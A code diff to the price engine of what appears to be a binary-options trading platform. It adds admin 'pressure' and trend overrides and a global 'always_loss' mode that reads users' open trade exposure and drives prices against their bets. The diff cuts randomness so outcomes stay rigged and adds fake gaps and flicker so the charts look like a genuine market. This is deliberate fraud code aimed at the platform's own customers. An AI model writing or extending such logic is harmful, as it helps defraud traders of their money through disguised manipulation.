@@ -5,12 +5,14 @@ import {
   saveCandleToDB_v2, TIMEFRAMES, timeframeSecondsMap
 } from './marketService.ts';
 import { getIO } from './socketService.ts';
+import { tradeExposureCache } from './tradeService.ts';
 
 const pairStates = new Map<string, {
   trend: number;
   trendDuration: number;
   volatilityMultiplier: number;
   lastTickTime: number;
+  momentum: number;
   newsEvent?: {
     intensity: number;
     duration: number;
@@ -28,11 +30,6 @@ export function updatePair(pair: string, type: 'real' | 'demo', now: number) {
   const m = pool[pair];
   if (!m) return null;
 
-  // Force targetPrice to null for real markets to ensure erratic simulation behavior
-  if (type === 'real') {
-    m.targetPrice = null;
-  }
-
   const stateKey = `${pair}_${type}`;
   let state = pairStates.get(stateKey);
   if (!state) {
@@ -40,7 +37,8 @@ export function updatePair(pair: string, type: 'real' | 'demo', now: number) {
       trend: 0,
       trendDuration: 0,
       volatilityMultiplier: 1,
-      lastTickTime: Date.now()
+      lastTickTime: Date.now(),
+      momentum: 0
     };
     pairStates.set(stateKey, state);
   }
@@ -48,8 +46,8 @@ export function updatePair(pair: string, type: 'real' | 'demo', now: number) {
   // 1. Calculate Time Step (dt)
   const nowMs = Date.now();
   let dt = (nowMs - state.lastTickTime) / 1000;
-  if (dt <= 0) dt = 0.1;
-  if (dt > 2) dt = 0.1;
+  if (dt <= 0) dt = 0.05; // default to 50ms
+  if (dt > 1) dt = 0.05;
   state.lastTickTime = nowMs;
 
   // 2. Trend & Momentum Management
@@ -65,79 +63,109 @@ export function updatePair(pair: string, type: 'real' | 'demo', now: number) {
     state.newsEvent = m.newsTrigger;
     m.newsTrigger = null; // Consume the trigger
     console.log(`📡 Manual News Event on ${pair} (${type})! Direction: ${state.newsEvent.direction}`);
-  } else if (Math.random() < 0.0005 * dt) { // Random news event ~ every 30 mins per pair
-    state.newsEvent = {
-      intensity: 3 + Math.random() * 5,
-      duration: 5000 + Math.random() * 10000,
-      direction: Math.random() > 0.5 ? 1 : -1
-    };
-    console.log(`📡 Random News Event on ${pair} (${type})! Direction: ${state.newsEvent.direction}`);
   }
 
   if (state.trendDuration <= 0) {
-    state.trendDuration = 10000 + Math.random() * 30000; // Longer trends: 10-40s
+    state.trendDuration = 5000 + Math.random() * 15000; // Shorter trends: 5-20s for more "active" charts
     
     let trendPower = (Math.random() - 0.5) * 2;
     
-    // Global Manipulation Integration
-    if (globalManipulationMode === 'always_loss') {
-      // For demo accounts, maybe we want them to lose? Or is it for real accounts?
-      // Usually manipulation is per-user, but global mode affects everyone.
-      // If we want a general "market crash" or "pump", we can use this.
-    }
-
-    state.trend = trendPower * 0.0008; // Slightly stronger base trend
-    state.volatilityMultiplier = 0.7 + Math.random() * 0.6;
+    // Respect Admin Trend Settings
+    if (m.trend === 'up') trendPower = Math.abs(trendPower) + 0.5;
+    else if (m.trend === 'down') trendPower = -Math.abs(trendPower) - 0.5;
+    
+    // Slightly stronger base trend for visual impact
+    state.trend = trendPower * 0.0018; 
+    state.volatilityMultiplier = 1.5 + Math.random() * 1.0; // Higher base volatility
   }
 
   // 3. GEOMETRIC BROWNIAN MOTION (GBM) CALCULATION with News & Manipulation
   const currentPrice = Number(m.price) || 100;
   
   let baseSigma = Number(m.volatility) || 0.0002;
-  if (baseSigma > 1) {
-    baseSigma = baseSigma / currentPrice;
-  }
-  
-  // If no target price is available, increase volatility and add random drift
-  // to ensure the market remains dynamic.
-  let volatilityMultiplier = state.volatilityMultiplier || 1;
+  // Always convert absolute volatility to relative volatility for GBM
+  baseSigma = baseSigma / currentPrice;
+
+  // Professional charts have significant noise even in trends
+  let volatilityMultiplier = state.volatilityMultiplier || 1.5;
   if (m.targetPrice === null) {
-      volatilityMultiplier *= (type === 'real' ? 3.0 : 1.5); // Even higher volatility for real markets (erratic)
+      volatilityMultiplier *= (type === 'real' ? 2.5 : 2.2); 
   }
 
   let sigma = baseSigma * volatilityMultiplier;
   let mu = state.trend || 0;
 
+  // Apply Admin Pressure (Manual override for candle outcome)
+  if (m.pressure && Math.abs(m.pressure) > 0) {
+    mu += (m.pressure / 100) * 0.015; // Strong bias based on pressure
+    sigma *= (1 - Math.abs(m.pressure) / 200); // Reduce randomness slightly when under high pressure
+  }
+  
+  // Apply Global Manipulation Mode
+  if (globalManipulationMode !== 'neutral') {
+    const exposureKey = `${pair}_${type}`;
+    const exposure = tradeExposureCache.get(exposureKey) || 0;
+    
+    // exposure > 0 means UP trades dominate. exposure < 0 means DOWN trades dominate.
+    if (exposure !== 0) {
+      let biasDirection = 0;
+      
+      if (globalManipulationMode === 'always_loss') {
+        // We want users to lose. If they bet UP (exposure > 0), we move DOWN (-1).
+        biasDirection = exposure > 0 ? -1 : 1;
+      } else if (globalManipulationMode === 'always_win') {
+        // We want users to win. If they bet UP, we move UP (1).
+        biasDirection = exposure > 0 ? 1 : -1;
+      }
+      
+      // Apply extreme drift based on mode
+      const manipulationStrength = 0.05; // Extremely strong drift to ensure the candle goes in the right direction
+      mu += biasDirection * manipulationStrength;
+      
+      // Optionally reduce randomness so it doesn't accidentally spike against us
+      sigma *= 0.5; 
+    }
+  }
+
   // Apply news intensity
   if (state.newsEvent) {
-    sigma *= (state.newsEvent.intensity || 1);
-    mu += (state.newsEvent.direction || 1) * 0.002 * (state.newsEvent.intensity || 1);
+    sigma *= (state.newsEvent.intensity || 1.5);
+    mu += (state.newsEvent.direction || 1) * 0.004 * (state.newsEvent.intensity || 1);
   }
   
   // Target Price Smoothing
   let targetDrift = 0;
-  if (m.targetPrice && Math.abs(m.targetPrice - currentPrice) > (currentPrice * 0.00001)) {
-    const diff = Number(m.targetPrice) - currentPrice;
-    targetDrift = (diff / currentPrice) * 0.1 * dt; // Faster smoothing (10% per sec)
+  if (m.targetPrice && currentPrice > 0 && Math.abs(m.targetPrice - currentPrice) > (currentPrice * 0.000001)) {
+    const rawDrift = (Number(m.targetPrice) - currentPrice) / currentPrice;
+    targetDrift = (rawDrift / 3.0) * dt; // Drift faster to target (3s)
   } else if (m.targetPrice === null) {
-      // If no target price, add a small random drift to simulate market sentiment
-      const driftMultiplier = type === 'real' ? 0.0015 : 0.0002;
+      const driftMultiplier = type === 'real' ? 0.0002 : 0.0001;
       targetDrift = (Math.random() - 0.5) * driftMultiplier * dt;
   }
   
+  // Random Walk Component (Shock)
   const u1 = Math.random() || 0.0001; 
   const u2 = Math.random();
   const dW = Math.sqrt(-2.0 * Math.log(u1)) * Math.cos(2.0 * Math.PI * u2) * Math.sqrt(dt);
   
-  const drift = (mu - 0.5 * Math.pow(sigma, 2)) * dt + targetDrift;
-  const shock = sigma * dW;
-  const priceMultiplier = Math.exp(drift + shock);
+  // Momentum Factor: Add short-term auto-correlation
+  // If price moved up last tick, it has a 30% bias to continue or reverse slightly
+  const momentumEffect = state.momentum * 0.15;
   
+  const drift = (mu - 0.5 * Math.pow(sigma, 2)) * dt + targetDrift + momentumEffect;
+  const shock = sigma * dW;
+  
+  // Add "Micro-Oscillations" for realistic "flicker" on 5s candles
+  const flicker = (Math.random() - 0.5) * sigma * 0.8; // Increased flicker
+  
+  const priceMultiplier = Math.exp(drift + shock + flicker);
   const newPrice = currentPrice * priceMultiplier;
   
+  // Update state momentum for next tick
+  state.momentum = (newPrice - currentPrice) / currentPrice;
+
   // Final safety check
   if (isNaN(newPrice) || !isFinite(newPrice) || newPrice <= 0) {
-    // Keep old price or fallback
     m.price = currentPrice;
   } else {
     m.price = newPrice;
@@ -237,10 +265,19 @@ export function updatePair(pair: string, type: 'real' | 'demo', now: number) {
       }
 
       // 5. Create new forming candle
+      let nextOpen = completedCandle.close;
+      
+      // Simulate occasional gap-up/gap-down for realism (OTC markets have micro-gaps)
+      if (tf === '5 seconds' && Math.random() < 0.15) { 
+         const gapSize = nextOpen * baseSigma * (Math.random() * 1.5 + 0.5); 
+         nextOpen += (Math.random() > 0.5 ? gapSize : -gapSize);
+         m.price = nextOpen; // immediately snap market price to gap
+      }
+
       candlePool[pair][tf] = {
-        open: completedCandle.close, // smooth continuation
-        high: Math.max(completedCandle.close, m.price),
-        low: Math.min(completedCandle.close, m.price),
+        open: nextOpen,
+        high: Math.max(nextOpen, m.price),
+        low: Math.min(nextOpen, m.price),
         close: m.price,
         volume: Math.random() * 5,
         openTime: bucketTime,
